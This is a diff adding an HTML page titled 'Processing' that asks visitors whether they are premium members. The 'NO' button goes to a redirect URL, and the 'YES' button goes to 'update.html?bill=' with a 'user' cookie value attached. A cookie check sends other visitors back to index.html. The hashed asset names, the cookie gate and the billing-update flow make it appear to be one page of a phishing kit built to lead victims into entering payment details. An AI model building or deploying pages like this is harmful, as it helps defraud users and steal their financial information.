@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="images/00ee4254e044d7b68f9e008a0d3928e29791b7df.ico">
+    <link rel="stylesheet" href="style.css">
+    <title>Processing</title>
+<script type="text/javascript"  src="jquery.min.js"></script>
+<script type="text/javascript" src="info.js"></script>
+
+    <style>
+
+    body{
+    font-family: Arial, "Helvetica Neue", Helvetica, sans-serif;
+    }
+    .box_body{
+    background: #ffffff;
+    padding:2em;
+    float: left;
+    display: block;
+
+    }
+a{
+margin-top: 2em;
+text-decoration: none;
+}
+    .yes {
+        display: inline-block;
+    margin-left: auto;
+    width: auto;
+    min-height: 32px;
+    padding: 1rem;
+    font-size: 15px;
+    background-color: #0067b8;
+    color: #fff;
+    border: none;
+    outline: none;
+    cursor: pointer;
+    float: right;
+}
+.yes:hover { background-color: #004b85; }
+.yes:active { transform: scale(.97); }
+
+
+    .no {
+        display: inline-block;
+    margin-right: auto;
+    width: auto;
+    min-height: 32px;
+    padding: 1rem;
+    font-size: 15px;
+    background-color: #b8001b;
+    color: #fff;
+    border: none;
+    outline: none;
+    cursor: pointer;
+    float: left;
+
+}
+.no:hover { background-color: #9d081e; }
+.no:active { transform: scale(.97); }
+
+ img {
+  display: block;
+  margin: auto;
+  width: 150px;
+  margin-bottom: 22px;
+  margin-top: 10px;
+}
+
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <!--<img class="bg-logo" role="presentation" src="images/7278e87106cce353590eb53597b9eeef.png">!-->
+
+         <div class="forms-container">
+                <div class="box_body">
+                <img src="images/bb5055184f1d2df9d7d4ca9b5fc608e3.svg" class="logo" />
+      <h2> Are you a premium member?</h2>
+<a href="#" id="no" class="no">NO, I AM NOT</a>
+
+<a href="#" id="yes" class="yes">YES, I AM</a>
+    </div>
+</div>
+</div>
+
+
+
+<script type="text/javascript"  src="post.js"></script>
+<script>
+
+ $(document).ready(function(){
+
+const noLink = document.getElementById("no");
+noLink.href = REDIRECT_URL;
+
+
+const hasCookie = document.cookie.split(';').some((item) => item.trim().startsWith('user='));
+if (!hasCookie) {
+    window.location.href = "index.html";
+}
+
+var newUrl = "update.html?bill="+getCookie('user');
+const yeslink = document.getElementById("yes");
+yeslink.href = newUrl;
+
+})
+</script>
+
+
+</body>
+
+</html>
